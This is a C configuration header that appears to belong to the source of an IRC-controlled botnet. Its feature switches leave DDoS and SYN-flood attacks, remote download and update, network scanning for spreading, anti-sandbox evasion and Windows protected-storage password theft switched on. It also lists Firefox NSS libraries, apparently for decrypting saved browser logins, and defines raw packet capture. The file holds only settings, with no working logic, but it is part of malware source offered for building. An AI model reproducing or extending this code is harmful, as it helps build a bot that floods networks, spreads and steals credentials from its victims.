//#define NO_DDOS
//#define NO_SUPERSYN
//#define NO_PING_REPLY
//#define NO_REMOVE_CMD
//#define NO_UPDATE
//#define NO_AIM
//#define NO_PSTORE
//#define NO_DOWNLOAD
//#define NO_ADVSCAN
//#define NO_ANTISANDBOX

#define NO_DDETECT
#define NO_OPENSSL
#define NO_CONNCHECK
#define NO_SERVICE
#define NO_DLLTEST
#define NO_VERSION_REPLY
#define NO_CEL
#define NO_STATUS
#define NO_WINDOWCTRL
#define NO_DDETECT
#define NO_LOGOUT_CMD
#define NO_SECURE
#define NO_VIRUSREMOVE
#define NO_SFCDISABLE
#define NO_WINS
#define NO_NETDDE
#define NO_EFTPD
#define NO_RECORD_UPTIME
#define NO_SYSINFO
#define NO_DRIVEINFO
#define NO_VSCAN
#define NO_CRYPT
#define NO_REDIRECT
#define NO_SOCK4SERV
#define NO_SPEEDTEST
#define NO_RDRIV
#define NO_FU
#define NO_REGCTRL
#define NO_FLUSHDNS
#define NO_FLUSHARP
#define NO_KEYLOG
#define NO_PROCESS
#define NO_LSARESTRICT
#define NO_SYSINFO
#define NO_DRIVEINFO
#define NO_NETINFO
#define NO_CHECKHOST
#define NO_NETSTATP
#define NO_CAPTURE
#define NO_MIRCCMD
#define NO_SPY_WARNING
#define NO_PING
#define NO_MELT
#define NO_FCONNECT
#define NO_RECORD_UPTIME
#define NO_INSTALLED_TIME
#define NO_AUTO_SECURE
#define NO_SNIFFER
#define NO_MIRCINFO
#ifdef _DEBUG
//#define NO_SERVICE
#endif

#define BK_THREAD 2

#define PING_TIMEOUT	200
#define IRCLINE			514
#define LOGLINE			128
#define MAX_TOKENS		64
#define MAX_LOGINS		3
#define MAX_THREADS		512
#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		20
#define REQ_NICKLEN		6
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22
#define MAX_LINES		2096
#define MAX_SCANDELAY	60
#define MIN_SCANDELAY	3
#define MAX_SCANTHRD	256
#define MAX_SCANTIME	9999
#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383
#define NICK_TYPE		N_OS
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_OS
#define FLOOD_DELAY		2000
#define SFLOOD_DELAY	7000
#define RUPTIME_DELAY	600000
#define SECURE_DELAY	600000
#define DEF_PORTSCAN_DELAY 5
#define NO_GET_IP_HTTP
#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))
#define NSS_LIBRARY_NAME   "nss3.dll"
#define PLC_LIBRARY_NAME   "plc4.dll"
#define NSPR_LIBRARY_NAME  "nspr4.dll"
#define SQLITE_LIBRARY_NAME  "sqlite3.dll"
#define MOZCRT_LIBRARY_NAME  "mozcrt19.dll"
#define NSSU_LIBRARY_NAME  "nssutil3.dll"
#define NSSU_LIBRARY_NAME  "nssutil3.dll"
#define PLDS_LIBRARY_NAME  "plds4.dll"
#define SOFTN_LIBRARY_NAME "softokn3.dll"
#define LOADLIBRARY(x)  LoadLibrary(x)
#define GETPROCADDRESS  GetProcAddress
#define FREELIBRARY     FreeLibrary
#define PRBool   int
#define PRUint32 unsigned int

#ifndef SIO_RCVALL
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
#endif


